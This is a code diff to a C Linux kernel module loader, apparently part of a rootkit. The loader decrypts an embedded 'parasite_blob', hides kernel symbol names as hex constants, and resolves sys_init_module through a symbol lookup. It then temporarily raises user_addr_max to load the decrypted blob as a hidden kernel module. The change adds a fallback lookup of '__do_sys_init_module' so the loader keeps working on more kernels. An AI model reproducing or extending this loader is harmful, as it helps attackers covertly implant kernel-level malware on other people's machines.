@@ -9,14 +9,26 @@
 
 #include "encrypt/encrypt.h"
 
-#define SYS_INIT_MODULE                                                        \
-	({                                                                     \
-		unsigned int *p = __builtin_alloca(16);                        \
-		p[0] = 0x5f737973;                                             \
-		p[1] = 0x74696e69;                                             \
-		p[2] = 0x646f6d5f;                                             \
-		p[3] = 0x00656c75;                                             \
-		(char *)p;                                                     \
+#define SYS_INIT_MODULE                                 \
+	({                                              \
+		unsigned int *p = __builtin_alloca(16); \
+		p[0] = 0x5f737973;                      \
+		p[1] = 0x74696e69;                      \
+		p[2] = 0x646f6d5f;                      \
+		p[3] = 0x00656c75;                      \
+		(char *)p;                              \
+	})
+
+#define __DO_SYS_INIT_MODULE                            \
+	({                                              \
+		unsigned int *p = __builtin_alloca(24); \
+		p[0] = 0x6f645f5f;                      \
+		p[1] = 0x7379735f;                      \
+		p[2] = 0x696e695f;                      \
+		p[3] = 0x6f6d5f74;                      \
+		p[4] = 0x656c7564;                      \
+		p[5] = 0x00000000;                      \
+		(char *)p;                              \
 	})
 
 static char parasite_blob[] = {
@@ -43,12 +55,15 @@ static inline unsigned long ksym_lookup_name(const char *name)
 
 int init_module(void)
 {
-	asmlinkage long (*sys_init_module)(const void *, unsigned long,
-					   const char *) = NULL;
+	asmlinkage long (*sys_init_module)(const void *, unsigned long, const char *) = NULL;
 
 	do_decrypt(parasite_blob, sizeof(parasite_blob), DECRYPT_KEY);
 
 	sys_init_module = (void *)ksym_lookup_name(SYS_INIT_MODULE);
+
+	if (!sys_init_module)
+		sys_init_module = (void *)ksym_lookup_name(__DO_SYS_INIT_MODULE);
+
 	if (sys_init_module) {
 		const char *nullarg = parasite_blob;
 		unsigned long seg = user_addr_max();
@@ -56,9 +71,7 @@ int init_module(void)
 		while (*nullarg)
 			nullarg++;
 
-		user_addr_max() = roundup((unsigned long)parasite_blob +
-					      sizeof(parasite_blob),
-					  PAGE_SIZE);
+		user_addr_max() = roundup((unsigned long)parasite_blob + sizeof(parasite_blob), PAGE_SIZE);
 		sys_init_module(parasite_blob, sizeof(parasite_blob), nullarg);
 		user_addr_max() = seg;
 	}
